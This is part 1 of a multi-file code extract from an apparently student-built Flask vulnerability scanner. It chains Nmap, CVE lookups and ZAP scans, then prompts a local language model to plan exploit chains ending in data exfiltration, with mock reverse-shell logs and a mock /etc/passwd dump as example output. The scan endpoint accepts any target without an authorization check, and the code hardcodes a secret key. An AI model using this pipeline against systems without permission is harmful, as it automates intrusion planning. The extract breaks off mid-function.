# Project Code Extract (Part 1/5)
- **Root:** `d:\3차 프로젝트\6트\12.26 app`
- **Files included:** 19 (Total: 92)

---

## File 1: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\__init__.py`

```python
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO
import os

db = SQLAlchemy()
socketio = SocketIO()

def create_app():
    app = Flask(__name__)
    basedir = os.path.abspath(os.path.dirname(__file__))
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, '../project.db')
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    app.config['SECRET_KEY'] = 'security-secret-key'

    db.init_app(app)
    socketio.init_app(app, cors_allowed_origins="*")

    # 웹소켓 핸들러 등록
    from app.api.websocket import register_socketio_handlers, ScanProgressEmitter
    register_socketio_handlers(socketio, ScanProgressEmitter(socketio))

    from app.routes import bp
    app.register_blueprint(bp)

    with app.app_context():
        db.create_all()

    return app, socketio
```
---

## File 2: ai_client.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\ai_client.py`

```python
# app/ai_client.py

import requests
import json
from flask import current_app


def build_prompt(cve_list, recon_info, chains, exploit_map):
    """
    - recon_info: Nmap 결과 (호스트/포트/서비스/버전)
    - cve_list: 전체 매핑된 CVE들 (cve-bin-tool 결과 + 필요시 cve-search 보강)
    - chains: 파이썬 코드가 만든 CVE 체인 후보 리스트
    - exploit_map: {CVE-ID: [ {title, id}, ... ], ...}

    exploit_map 예:
    {
      "CVE-2021-41773": [
        {"title": "Apache HTTP Server 2.4.49 - Path Traversal & RCE", "id": "50383"},
        {"title": "Apache 2.4.49/2.4.50 - Traversal Shell (Metasploit)", "id": "50406"}
      ]
    }
    """
    instructions = """
너는 15년 경력의 화이트해커이자 레드팀 리더야.
아래 제공하는 Nmap 스캔 결과(recon_info), CVE 목록(cve_list),
공격 체인 후보(chains), 그리고 각 CVE에 대한 Searchsploit exploit 리스트(exploit_map)를 바탕으로,
공격자 입장에서 가장 효율적인 '침투 체인(Exploit Chain)'을 설계해줘.

요구사항:

1. 반드시 chains에 있는 CVE들만 사용해서 공격 시나리오를 구성해.
   - 새로운 CVE ID를 만들어내거나, 입력에 없는 CVE를 사용하지 마.
2. 가능한 한 현실적인 1~2개의 공격 체인만 선택해서 상세 시나리오를 작성해.
   - 각 체인은 initial_access -> privilege_escalation -> lateral_movement -> data_exfiltration
     순서를 따르려고 노력해. 중간 단계가 없어도 괜찮지만, 순서를 뒤집지는 마.
3. Searchsploit ID는 "참고용"으로만 사용해.
   - 실제 payload 문자열이나 완전한 exploit 코드는 생성하지 말고,
     개념적인 단계와 영향만 설명해.
4. 모르는 부분은 지어내지 말고 "unknown"이라고 표기해.

출력 형식:

반드시 JSON 하나만 보내. 다른 설명 문장이나 주석은 넣지 마.

JSON 스키마 예시는 다음과 같아:

{
  "selected_chains": [
    {
      "chain_id": 1,
      "description": "요약 설명",
      "steps": [
        "1단계: CVE-XXXX-AAAA (initial_access), Searchsploit ID 50383을 참고하여 8080 포트 Apache 웹서버에서 Path Traversal 기반 RCE를 시도한다 ...",
        "2단계: CVE-YYYY-BBBB (privilege_escalation)를 이용해 www-data에서 root로 권한 상승을 시도한다 ...",
        "3단계: CVE-ZZZZ-CCCC (data_exfiltration)를 통해 MySQL DB에서 중요한 데이터를 덤프한다 ..."
      ]
    }
  ],
  "scenario": [
    "... 전체 공격 과정을 해커 입장에서 서술한 시나리오 ..."
  ],
  "proof": {
    "loot_files": [
      {
        "path": "/etc/passwd",
        "content": "root:x:0:0:root:/root:/bin/bash\n..."
      }
    ],
    "logs": [
      "[+] Exploit CVE-XXXX-AAAA sent to 203.0.113.10:8080",
      "[+] Got reverse shell: www-data@target",
      "[+] Escalated to root using CVE-YYYY-BBBB",
      "[+] Dumped /etc/passwd and user table from MySQL (size: 32KB)"
    ]
  }
}

주의:

- 실제 IP나 민감 정보는 모두 더미 값(예: 203.0.113.10, 198.51.100.5)으로 바꿔줘.
- selected_chains의 steps에는 반드시 어떤 CVE를 어떤 역할(role)로 쓰는지, 어느 포트/서비스와 연결되는지 명시해.
"""

    recon_text = json.dumps(recon_info, ensure_ascii=False, indent=2)
    cve_text = json.dumps(cve_list, ensure_ascii=False, indent=2)
    chains_text = json.dumps(chains, ensure_ascii=False, indent=2)
    exploit_text = json.dumps(exploit_map, ensure_ascii=False, indent=2)

    prompt = f"""{instructions}

[recon_info]
{recon_text}

[cve_list]
{cve_text}

[chains]
{chains_text}

[exploit_map]
{exploit_text}
"""
    return prompt


def call_ollama(prompt: str):
    base_url = current_app.config["OLLAMA_BASE_URL"]
    model = current_app.config["OLLAMA_MODEL"]
    url = f"{base_url}/api/generate"

    payload = {
        "model": model,
        "prompt": prompt,
        "stream": False,
    }

    try:
        resp = requests.post(url, json=payload, timeout=300)
        resp.raise_for_status()
    except requests.exceptions.RequestException as e:
        return {
            "selected_chains": [],
            "scenario": [f"[AI 호출 실패] {e}"],
            "proof": {
                "loot_files": [],
                "logs": [],
            },
        }

    data = resp.json()
    raw_text = data.get("response", "")

    try:
        parsed = json.loads(raw_text)
    except json.JSONDecodeError:
        parsed = {
            "selected_chains": [],
            "scenario": [raw_text],
            "proof": {
                "loot_files": [],
                "logs": [],
            },
        }

    return parsed
```
---

## File 3: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\api\__init__.py`

```python
# API endpoints

```
---

## File 4: routes.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\api\routes.py`

```python
# app/api/routes.py - Import Section

from flask import Blueprint, render_template, request, jsonify, current_app  # type: ignore
import nmap  # type: ignore
import re
import asyncio
import logging
import importlib.util
import os
from typing import List, Dict, Any
from pathlib import Path

# ========== Core Imports ==========
from ..core.cve.cpe_generator import batch_generate_cpes
from ..core.recon.network import run_recon, collect_network_info
from ..core.recon.web import collect_web_info
from ..core.recon.os import collect_os_info
from ..core.recon.database import collect_database_info
from ..core.recon.cloud import collect_cloud_info
from ..core.recon.container import collect_container_info
from ..core.scenario.generator import build_prompt, call_ollama
from ..core.scenario.reporter import enrich_loot
from ..core.cve.async_nvd_client import AsyncNvdClient
from ..core.cve.cache_manager import CacheManager
from ..core.cve.matcher import (
    extract_cve_summary,
    deduplicate_cves,
    parse_and_normalize_version,
    parse_complex_version_string,
    normalize_product_name,
    extract_product_from_version_string,
    map_product_to_vendor_product,
    build_cpe_string,
    search_cves_universal
)
from ..utils.exploit import search_exploits_for_cves
from app.core.verifier import VulnerabilityVerifier

# ========== Scanner Import (지연 로딩) ==========
# run_network_scan은 app/core/scanner.py에 있음
# Circular import 방지를 위해 함수 레벨에서 import
def get_run_network_scan():
    """지연 import로 run_network_scan 함수 가져오기"""
    scanner_path = os.path.join(
        os.path.dirname(__file__), 
        '..',
        'core', 
        'scanner.py'
    )
    
    if not os.path.exists(scanner_path):
        raise ImportError(f"scanner.py not found at {scanner_path}")
    
    spec = importlib.util.spec_from_file_location("core_scanner", scanner_path)
    scanner_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(scanner_module)
    
    return scanner_module.run_network_scan

# ========== Logger ==========
import time
logger = logging.getLogger(__name__)

# ========== Blueprint ==========
bp = Blueprint('main', __name__)


# 전역 캐시 매니저 (앱 시작 시 한 번만 초기화)
cache_manager = None


def get_cache_manager():
    """캐시 매니저 싱글톤"""
    global cache_manager
    if cache_manager is None:
        # 프로젝트 루트 계산 (api/routes.py 기준으로 app/의 부모 = 프로젝트 루트)
        project_root = Path(__file__).parent.parent.parent
        data_dir = project_root / "data"
        data_dir.mkdir(exist_ok=True)
        
        cache_manager = CacheManager(
            backend="sqlite",
            ttl=86400,  # 24시간
            db_path=str(data_dir / "cve_cache.db")  # 절대 경로
        )
        # 앱 시작 시 만료된 캐시 정리
        cache_manager.clear_expired()
    return cache_manager



# ========================================
# 🆕 헬퍼 함수: 스캐너 출력 파싱
# ========================================


def extract_tech_info_from_scanner(tech_item: Dict[str, Any]) -> Dict[str, str]:
    """
    스캐너 출력에서 product와 version 추출 (다양한 형식 지원)
    
    Args:
        tech_item: 스캐너 출력 항목
    
    Returns:
        {"product": "nginx", "version": "1.19.0"}
    """
    # Case 1: network.py 출력 (full_version 필드 우선 사용)
    if "full_version" in tech_item and tech_item.get("full_version"):
        full_version = tech_item["full_version"]
        
        # parse_complex_version_string 사용
        parsed = parse_complex_version_string(full_version)
        
        return {
            "product": parsed.get("product", ""),
            "version": parsed.get("version", "")
        }
    
    # Case 2: network.py 출력 (product + version 필드)
    if "product" in tech_item and "version" in tech_item:
        product = tech_item.get("product", "")
        version = tech_item.get("version", "")
        
        return {
            "product": normalize_product_name(product),
            "version": parse_and_normalize_version(version) or version
        }
    
    # Case 3: web.py, database.py 출력 ("name" 필드)
    if "name" in tech_item:
        name = tech_item["name"]
        
        # parse_complex_version_string 사용
        parsed = parse_complex_version_string(name)
        
        return {
            "product": parsed.get("product", ""),
            "version": parsed.get("version", "")
        }
    
    # Case 4: 알 수 없는 형식
    logger.warning(f"Unknown tech_item format: {tech_item}")
    return {
        "product": "",
        "version": ""
    }



def extract_tech_info_from_recon(host: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    recon 결과 (network.py)에서 기술 정보 추출
    
    Args:
        host: run_recon() 반환값의 개별 호스트
    
    Returns:
        [{"product": "nginx", "version": "1.19.0", "port": 80, "host_ip": "192.168.1.x"}, ...]
    """
    technologies = []
    
    for port in host.get("ports", []):
        # full_version 필드 우선 사용
        tech_info = extract_tech_info_from_scanner(port)
        
        if tech_info["product"]:
            technologies.append({
                "product": tech_info["product"],
                "version": tech_info["version"],
                "port": port.get("port"),
                "host_ip": host.get("ip"),
                "source": "network_scan",
                "service": port.get("service"),
                # NSE 스크립트 취약점도 추가
                "nse_vulnerabilities": port.get("nse_scripts", []),
                "has_vulnerabilities": port.get("has_vulnerabilities", False)
            })
    
    return technologies


def extract_tech_info_from_web(web_info: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    web.py 출력에서 기술 정보 추출
    Returns:
        [{\"product\": \"apache\", \"version\": \"2.4.66\", \"source\": \"web_scan\"}, ...]
    """
    technologies = []
    
    # 🆕 디버깅: 입력 데이터 확인
    print("\n" + "="*70)
    print("[DEBUG-ROUTES] extract_tech_info_from_web() 호출됨")
    print(f"[DEBUG-ROUTES] web_info 키: {list(web_info.keys())}")
    
    web_technologies = web_info.get('webtechnologies', [])  # ⭐ 밑줄 제거!
    print(f"DEBUG: Type of web_technologies: {type(web_technologies)}")
    print(f"WORKFLOW: Web recon completed - Found {len(web_technologies)} technologies")
    
    for idx, tech in enumerate(web_technologies):
        # 🆕 디버깅: 각 기술 정보 출력
        print(f"\n[DEBUG-ROUTES] Tech #{idx+1}:")
        print(f"  - name: {tech.get('name', 'N/A')}")
        print(f"  - version: {tech.get('version', 'N/A')}")
        print(f"  - product: {tech.get('product', 'N/A')}")
        print(f"  - category: {tech.get('category', 'N/A')}")
        print(f"  - language: {tech.get('language', 'N/A')}")
        print(f"  - source: {tech.get('source', 'N/A')}")
        
        # 🆕 안전한 값 추출
        name = tech.get('name', '')
        version = tech.get('version', '')
        product = tech.get('product', name)
        
        # 🆕 빈 문자열 처리
        if not name or name.strip() == '':
            name = 'Unknown'
        if not version or version.strip() == '':
            version = 'N/A'
        if not product or product.strip() == '':
            product = name
        
        tech_info = extract_tech_info_from_scanner(tech)
        if tech_info["product"]:
            # 🆕 extract_tech_info_from_scanner 결과도 빈 문자열 체크
            final_product = tech_info["product"] or product or "Unknown"
            final_version = tech_info["version"] or version or "N/A"
            
            tech_obj = {
                "product": final_product,
                "version": final_version,
                "source": "web_scan",
                "tech_type": tech.get("type"),
                "original_name": tech.get("name")
            }
            
            # 🆕 디버깅: 생성된 객체 확인
            print(f"[DEBUG-ROUTES] 생성된 tech_obj: {tech_obj}")
            
            technologies.append(tech_obj)
    
    print(f"\n[DEBUG-ROUTES] 총 {len(technologies)}개 기술 추출됨")
    print("="*70 + "\n")
    
    return technologies


def extract_tech_info_from_database(db_info: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    database.py 출력에서 기술 정보 추출
    
    Returns:
        [{"product": "mysql", "version": "5.7.35", "source": "database_scan"}, ...]
    """
    technologies = []
    
    for tech in db_info.get("database_technologies", []):
        tech_info = extract_tech_info_from_scanner(tech)
        
        if tech_info["product"]:
            technologies.append({
                "product": tech_info["product"],
                "version": tech_info["version"],
                "source": "database_scan",
                "port": tech.get("port"),
                "db_type": tech.get("db_type"),
                # 위험 정보 태깅
                "anonymous_access": tech.get("anonymous_access", False),
                "dangerous": tech.get("dangerous", False),
                "weak_credentials": tech.get("weak_credentials", []),
                "original_name": tech.get("name")  # 디버깅용
            })
    
    return technologies



def extract_tech_info_from_os(os_info: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    os.py 출력에서 기술 정보 추출
    
    Returns:
        [{"product": "linux", "version": "4.15", "source": "os_scan"}, ...]
    """
    technologies = []
    
    for tech in os_info.get("os_technologies", []):
        tech_info = extract_tech_info_from_scanner(tech)
        
        if tech_info["product"]:
            technologies.append({
                "product": tech_info["product"],
                "version": tech_info["version"],
                "source": "os_scan",
                "original_name": tech.get("name")
            })
    
    return technologies



def extract_tech_info_from_cloud(cloud_info: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    cloud.py 출력에서 기술 정보 추출
    
    Returns:
        [{"product": "aws", "version": "", "source": "cloud_scan"}, ...]
    """
    technologies = []
    
    for tech in cloud_info.get("cloud_technologies", []):
        tech_info = extract_tech_info_from_scanner(tech)
        
        if tech_info["product"]:
            technologies.append({
                "product": tech_info["product"],
                "version": tech_info["version"],
                "source": "cloud_scan",
                "original_name": tech.get("name")
            })
    
    return technologies



def extract_tech_info_from_container(container_info: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    container.py 출력에서 기술 정보 추출
    
    Returns:
        [{"product": "docker", "version": "20.10", "source": "container_scan"}, ...]
    """
    technologies = []
    
    for tech in container_info.get("container_technologies", []):
        tech_info = extract_tech_info_from_scanner(tech)
        
        if tech_info["product"]:
            technologies.append({
                "product": tech_info["product"],
                "version": tech_info["version"],
                "source": "container_scan",
                "original_name": tech.get("name")
            })
    
    return technologies

def deduplicate_technologies(technologies: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    기술 목록에서 중복 제거 (같은 product는 버전 있는 것 우선)
    
    Args:
        technologies: 기술 정보 리스트
        
    Returns:
        중복 제거된 기술 리스트
    """
    seen_products = {}
    
    for tech in technologies:
        product = tech.get('product', '').lower()
        version = tech.get('version', 'N/A')
        
        if not product:
            continue
            
        # 첫 등장이거나, 기존 항목이 버전 없고 현재 항목에 버전 있으면 교체
        if product not in seen_products:
            seen_products[product] = tech
        else:
            existing_version = seen_products[product].get('version', 'N/A')
            
            # 버전이 있는 것으로 우선 선택
            if existing_version == 'N/A' and version != 'N/A':
                seen_products[product] = tech
                print(f"[DEDUP] 교체: {product} (N/A -> {version})")
                logger.info(f"[DEDUP] Replaced {product}: N/A -> {version}")
            elif existing_version != 'N/A' and version == 'N/A':
                # 기존에 버전 있으면 유지
                print(f"[DEDUP] 유지: {product} (버전 있음: {existing_version})")
                logger.info(f"[DEDUP] Kept {product} with version: {existing_version}")
            else:
                # 둘 다 버전 있거나 둘 다 없으면 먼저 발견된 것 유지
                print(f"[DEDUP] 중복 무시: {product} ({version})")
                logger.debug(f"[DEDUP] Duplicate ignored: {product}")
    
    result = list(seen_products.values())
    print(f"[DEDUP] ✅ {len(technologies)}개 -> {len(result)}개로 중복 제거 완료")
    logger.info(f"[DEDUP] Deduplicated: {len(technologies)} -> {len(result)}")
    
    return result

# ========================================
# CVE 관련 함수
# ========================================


def score_cve_exploitability(cve_item: dict, exploit_map: dict) -> int:
    """
    CVE의 실제 공격 가능성 점수 계산
    
    Args:
        cve_item: CVE 정보
        exploit_map: Exploit 매핑 정보
    
    Returns:
        공격 가능성 점수 (높을수록 우선순위 높음)
    """
    score = 0
    
    # 1. CVSS 기본 점수
    cvss = cve_item.get("cvss", 0)
    if cvss >= 9.0:
        score += 10
    elif cvss >= 7.0:
        score += 5
    elif cvss >= 4.0:
        score += 2
    
    # 2. Searchsploit에 실제 exploit 있으면 대폭 가산
    if cve_item.get("cve_id") in exploit_map:
        score += 20
    
    # 3. 매칭 신뢰도
    confidence = cve_item.get("match_confidence", "none")
    if confidence == "high":
        score += 10
    elif confidence == "medium":
        score += 5
    elif confidence == "low":
        score += 2
    
    # 4. 최근 CVE일수록 높은 점수
    try:
        cve_id = cve_item.get("cve_id", "CVE-2000-0000")
        year = int(cve_id.split("-")[1])
        if year >= 2024:
            score += 15
        elif year >= 2022:
            score += 10
        elif year >= 2020:
            score += 5
    except:
        pass
    
    return score



def build_attack_chains(recon_result, all_cves, exploit_map):
    """
    여러 CVE를 엮은 공격 체인 후보 생성
    
    Args:
        recon_result: 정찰 결과
        all_cves: 전체 CVE 리스트
        exploit_map: Exploit 매핑
    
    Returns:
        공격 체인 리스트
    """
    chains = []
    chain_id = 1
    
    # CVE들을 공격 가능성 점수로 정렬
    scored_cves = [
        (cve, score_cve_exploitability(cve, exploit_map)) 
        for cve in all_cves
    ]
    scored_cves.sort(key=lambda x: x[1], reverse=True)
    
    # 역할별로 분류
    initial = [c for c, s in scored_cves if c.get("cvss", 0) >= 7.0]
    privesc = [
        c for c, s in scored_cves
        if "privilege" in (c.get("description") or "").lower()
    ]
    exfil = [
        c for c, s in scored_cves
        if any(keyword in (c.get("description") or "").lower() 
               for keyword in ["sql", "information disclosure", "data leak", "file read"])
    ]
    
    logger.info(f"Attack chain candidates - Initial: {len(initial)}, Privesc: {len(privesc)}, Exfil: {len(exfil)}")
    
    if not initial:
        return chains
    
    max_chain = 3
    for i, init_cve in enumerate(initial[:max_chain]):
        chain_steps = []
        
        host_ip = init_cve.get("host_ip") or (
            recon_result[0].get("ip") if recon_result else "127.0.0.x"
        )
        service = init_cve.get("service") or init_cve.get("technology") or "unknown"
        port = init_cve.get("port")
        
        # 1단계: initial_access
        chain_steps.append({
            "step": 1,
            "role": "initial_access",
            "cve_id": init_cve.get("cve_id"),
            "cvss": init_cve.get("cvss"),
            "service": service,
            "port": port,
            "confidence": init_cve.get("match_confidence", "none")
        })
        
        step_num = 2
        
        # 2단계: privilege_escalation
        if privesc:
            pe = privesc[i % len(privesc)]
            chain_steps.append({
                "step": step_num,
                "role": "privilege_escalation",
                "cve_id": pe.get("cve_id"),
                "cvss": pe.get("cvss"),
                "service": pe.get("service") or pe.get("technology") or "unknown",
                "port": pe.get("port"),
                "confidence": pe.get("match_confidence", "none")
            })
            step_num += 1
        
        # 3단계: data_exfiltration
        if exfil:
            de = exfil[i % len(exfil)]
            chain_steps.append({
                "step": step_num,
                "role": "data_exfiltration",
                "cve_id": de.get("cve_id"),
                "cvss": de.get("cvss"),
                "service": de.get("service") or de.get("technology") or "unknown",
                "port": de.get("port"),
                "confidence": de.get("match_confidence", "none")
            })
        
        chains.append({
            "chain_id": chain_id,
            "host_ip": host_ip,
            "steps": chain_steps,
        })
        chain_id += 1
    
    logger.info(f"Generated {len(chains)} attack chains")
    return chains



async def search_cves_parallel(technologies: List[Dict[str, Any]], max_pages: int = 1) -> List[Dict[str, Any]]:
    """
    CVE 병렬 검색 (CPE 자동 발견 포함)
    
    Args:
        technologies: [{"product": "nginx", "version": "1.19.0", ...}, ...]
        max_pages: 최대 페이지 수
    
    Returns:
        CVE 리스트
    """
    nvd_client = AsyncNvdClient(max_concurrent=10, cache_size=2000)
    
    # 제품 리스트 생성
    products = []
    for tech in technologies:
        product = tech.get("product", "")
        version = tech.get("version", "")
        
        if not product:
            continue
        
        products.append({
            "product": product,
            "version": version,
            "tech_info": tech  # 원본 정보 보존
        })
    
    if not products:
        return []
    
    logger.info(f"Starting parallel CVE search for {len(products)} products")
    
    # 병렬 CVE 검색 (CPE 자동 발견 포함)
    all_cves = []
    
    # asyncio.gather로 병렬 실행
    tasks = []
    for prod in products:
        task = search_cves_universal(
            tech_name=prod["product"],
            tech_version=prod["version"],
            nvd_client=nvd_client
        )
        tasks.append((task, prod))  # task와 제품 정보를 함께 저장
    
    # 모든 검색 병렬 실행
    results = await asyncio.gather(*[t[0] for t in tasks], return_exceptions=True)
    
    # 결과 처리
    for idx, (result, prod) in enumerate(zip(results, [t[1] for t in tasks])):
        if isinstance(result, Exception):
            logger.error(f"CVE search failed for {prod['product']}: {result}")
            continue
        
        tech_info = prod["tech_info"]
        
        # CVE 정보에 기술 스택 정보 추가
        for cve_summary in result:
            if cve_summary.get("is_vulnerable"):
                # 기술 정보 추가
                cve_summary["technology"] = f"{prod['product']} {prod['version']}".strip()
                cve_summary["product"] = prod["product"]
                cve_summary["version"] = prod["version"]
                cve_summary["source"] = tech_info.get("source", "unknown")
                cve_summary["port"] = tech_info.get("port")
                cve_summary["host_ip"] = tech_info.get("host_ip")
                
                # 추가 정보
                if tech_info.get("anonymous_access"):
                    cve_summary["anonymous_access"] = True
                if tech_info.get("dangerous"):
                    cve_summary["dangerous"] = True
                if tech_info.get("nse_vulnerabilities"):
                    cve_summary["nse_vulnerabilities"] = tech_info["nse_vulnerabilities"]
                
                all_cves.append(cve_summary)
    
    # 통계 출력
    stats = nvd_client.get_stats()
    logger.info(f"CVE search completed. Stats: {stats}")
    
    return all_cves



# ========================================
# 라우트
# ========================================


@bp.route("/")
def index():
    """대시보드 페이지"""
    return render_template("dashboard.html")



@bp.route("/api/scan", methods=["POST"])
def api_scan():
    """통합 스캔 API"""
    data = request.get_json() or {}
    target = data.get("target")
    
    if not target:
        return jsonify({"error": "target is required"}), 400
    
    # localhost를 127.0.0.1로 변환
    if "localhost" in target.lower():
        target = target.lower().replace("localhost", "127.0.0.1")
        logger.info(f"[DEBUG] Converted target to: {target}")
    
    # 비동기 실행
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(async_scan_workflow(target))
        return jsonify(result)
    except Exception as e:
        logger.exception(f"Scan failed: {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        loop.close()

async def search_cves_for_technologies(
    technologies: List[Dict[str, Any]],
    nvd_client,
    cache_manager
) -> List[Dict[str, Any]]:
    """
    기술 정보 리스트에서 CVE 검색
    """
    all_cves = []
    
    print(f"\n[CVE-SEARCH] Starting CVE search for {len(technologies)} technologies...")
    logger.info(f"[CVE-SEARCH] Starting CVE search for {len(technologies)} technologies")
    
    for idx, tech in enumerate(technologies, 1):
        product = tech.get("product", "")
        version = tech.get("version", "")
        cpe = tech.get("cpe", "")
        filtered = tech.get("filtered", False)  # 🆕 필터링 여부 확인
        
        print(f"[CVE-SEARCH] [{idx}/{len(technologies)}] Searching: {product} v{version}")
        logger.info(f"[CVE-SEARCH] [{idx}/{len(technologies)}] Product: {product}, Version: {version}")
        
        if not product:
            print(f"[CVE-SEARCH] ⚠️ Skipping (no product name)")
            logger.warning(f"[CVE-SEARCH] Skipping empty product")
            continue
        
        # 🆕 필터링된 항목은 CVE 검색 건너뛰기
        if filtered:
            print(f"[CVE-SEARCH] ⚠️ Skipping filtered product: {product}")
            logger.info(f"[CVE-SEARCH] Skipping filtered: {product}")
            continue
        
        try:
            # CPE가 있으면 CPE로 검색, 없으면 키워드 검색
            if cpe:
                print(f"[CVE-SEARCH]   Using CPE: {cpe}")
                logger.info(f"[CVE-SEARCH]   CPE: {cpe}")
                
                # 캐시 확인
                cached = cache_manager.get(cpe)
                if cached is not None:
                    print(f"[CVE-SEARCH]   ✓ Cache hit: {len(cached)} CVEs")
                    logger.info(f"[CVE-SEARCH]   Cache hit: {len(cached)} CVEs")
                    cves = cached
                else:
                    # NVD API 호출
                    cves = await nvd_client.search_cves_by_cpe(cpe, max_results=100)
                    
                    print(f"[CVE-SEARCH]   ✓ API returned: {len(cves)} CVEs")
                    logger.info(f"[CVE-SEARCH]   API returned: {len(cves)} CVEs")
                    
                    # 캐시 저장
                    if cves:
                        cache_manager.set(cpe, cves)
            else:
                # 🆕 CPE 없으면 건너뛰기 (키워드 검색 하지 않음)
                print(f"[CVE-SEARCH]   ⚠️ No CPE, skipping CVE search for: {product}")
                logger.info(f"[CVE-SEARCH]   No CPE: {product}")
                continue
            
            # CVE 요약 정보 생성
            for cve_raw in cves:
                cve_summary = extract_cve_summary(cve_raw)
                
                # 기술 정보 추가
                cve_summary["host_ip"] = tech.get("host_ip", "N/A")
                cve_summary["port"] = tech.get("port", "N/A")
                cve_summary["service"] = tech.get("service", product)
                cve_summary["product"] = product
                cve_summary["version"] = version
                cve_summary["source"] = tech.get("source", "unknown")
                
                # 추가 플래그
                if tech.get("anonymous_access"):
                    cve_summary["anonymous_access"] = True
                if tech.get("dangerous"):
                    cve_summary["dangerous"] = True
                if tech.get("nse_vulnerabilities"):
                    cve_summary["nse_vulnerabilities"] = tech.get("nse_vulnerabilities")
                
                all_cves.append(cve_summary)
        
        except Exception as e:
            print(f"[CVE-SEARCH] ❌ Error searching CVEs for {product}: {e}")
            logger.exception(f"[CVE-SEARCH] Exception for {product}: {e}")
            continue
    
    print(f"\n[CVE-SEARCH] ✅ Total CVEs found: {len(all_cves)}")
    logger.info(f"[CVE-SEARCH] Total CVEs found: {len(all_cves)}")
    
    # 중복 제거
    unique_cves = deduplicate_cves(all_cves)
    
    print(f"[CVE-SEARCH] ✅ After deduplication: {len(unique_cves)} unique CVEs")
    logger.info(f"[CVE-SEARCH] After deduplication: {len(unique_cves)} unique CVEs")
    
    return unique_cves

async def async_scan_workflow(target: str):
    """
    통합 취약점 스캔 워크플로우 (최종 완벽 호환 버전)
    - Fix: AI 시나리오를 문자열(text)과 객체(object) 두 가지 형태로 모두 제공
    - Result: 프론트엔드 호환성 100% 보장
    """
    from ..core.recon.network import run_recon
    from ..core.recon.web import collect_web_info
    from ..core.cve.cpe_generator import batch_generate_cpes
    from ..core.cve.async_nvd_client import AsyncNvdClient
    from ..core.verifier import VulnerabilityVerifier
    from ..core.scenario.generator import call_ollama 
    from ..utils.exploit import search_exploits_for_cves
    from ..core.scanner.zap_scanner import ZapScanner, format_alerts_for_dashboard
    import json
    
    cache_manager = get_cache_manager()
    
    # CVE 매처 가져오기
    search_cves_func = None
    try:
        from ..core.cve.matcher import search_cves_for_technologies
        search_cves_func = search_cves_for_technologies
    except ImportError:
        try:
            from ..core.cve.matcher import search_cves_universal
            search_cves_func = search_cves_universal
        except ImportError:
            logger.warning("CVE Matcher functions not found!")

    logger.info("="*70)
    logger.info(f"WORKFLOW: Starting comprehensive scan for {target}")

    # ========== Step 1: Nmap 스캔 ==========
    print(f"WORKFLOW: Step 1 - Running Nmap scan on {target}...")
    recon_result = run_recon(target)
    print(f"WORKFLOW: Found {len(recon_result)} hosts")

    # ========== Step 2: Web Recon ==========
    print(f"WORKFLOW: Step 2 - Running web reconnaissance...")
    web_info = {}
    try:
        web_info = collect_web_info(target)
        print(f"WORKFLOW: Web recon completed")
    except Exception:
        pass

    # ========== Step 3: 인프라 (안전 모드) ==========
    print(f"WORKFLOW: Step 3 - Infrastructure info...")
    cloud_info = {}
    try:
        from ..core.recon.cloud import discover_cloud_assets
        cloud_info = discover_cloud_assets(target)
    except Exception:
        pass

    # ========== Step 4: CPE 생성 ==========
    print(f"WORKFLOW: Step 4 - Generating CPE identifiers...")
    technologies_with_cpe = []
    
    if isinstance(recon_result, list):
        for host in recon_result:
            for port in host.get("ports", []):
                tech = {
                    "product": port.get("product", "unknown"),
                    "version": port.get("version", ""),
                    "service": port.get("service", "unknown"),
                    "port": port.get("port"),
                    "ip": host.get("ip"),
                    "source": "nmap",
                    "category": "detected"
                }
                technologies_with_cpe.append(tech)
    
    if web_info and 'webtechnologies' in web_info:
        for tech_info in web_info['webtechnologies']:
            tech = {
                'product': tech_info.get('name', tech_info.get('product', 'unknown')),
                'version': tech_info.get('version', ''),
                'service': 'web',
                'source': 'web_recon',
                'category': 'other'
            }
            technologies_with_cpe.append(tech)

    technologies_with_cpe = batch_generate_cpes(technologies_with_cpe)
    cpe_techs = [t for t in technologies_with_cpe if t.get("cpe")]
    print(f"WORKFLOW: Generated CPE for {len(cpe_techs)} technologies")

    # ========== Step 5: CVE 검색 ==========
    print(f"WORKFLOW: Step 5 - Searching for CVEs...")
    nvd_client = AsyncNvdClient(
        api_key=current_app.config.get("NVD_API_KEY"),
        base_url=current_app.config.get("NVD_BASE_URL")
    )
    all_cves = []
    
    if search_cves_func:
        print(f"WORKFLOW: Searching CVEs for {len(cpe_techs)} technologies...")
        for tech in cpe_techs:
            prod = tech.get('product')
            ver = tech.get('version')
            try:
                cves = await search_cves_func(
                    prod, 
                    ver,
                    nvd_client=nvd_client,
                    cache_manager=cache_manager
                )
                if cves: 
                    all_cves.extend(cves)
            except Exception:
                pass 

    unique_cves = {}
    for cve in all_cves:
        if cve and isinstance(cve, dict) and cve.get('id'):
            unique_cves[cve.get('id')] = cve
    all_cves = list(unique_cves.values())
    print(f"WORKFLOW: Found {len(all_cves)} CVEs")

    # ========== Step 6.5: ZAP 스캔 ==========
    print(f"WORKFLOW: Step 6.5 - Running OWASP ZAP security scan...")
    zap_alerts = []
    try:
        zap_scanner = ZapScanner(
            api_key=current_app.config.get('ZAP_API_KEY'),
            proxy_host=current_app.config.get('ZAP_PROXY_HOST'),
            proxy_port=current_app.config.get('ZAP_PROXY_PORT')
        )
        scan_result = zap_scanner.full_scan(target)
        if scan_result and 'alerts' in scan_result:
            zap_alerts = format_alerts_for_dashboard(scan_result['alerts'])
    except Exception:
        print("WORKFLOW: ZAP scan skipped")

    # ========== Step 7: 검증 ==========
    print(f"WORKFLOW: Step 7 - Verifying vulnerabilities...")
    verifications = []
    try:
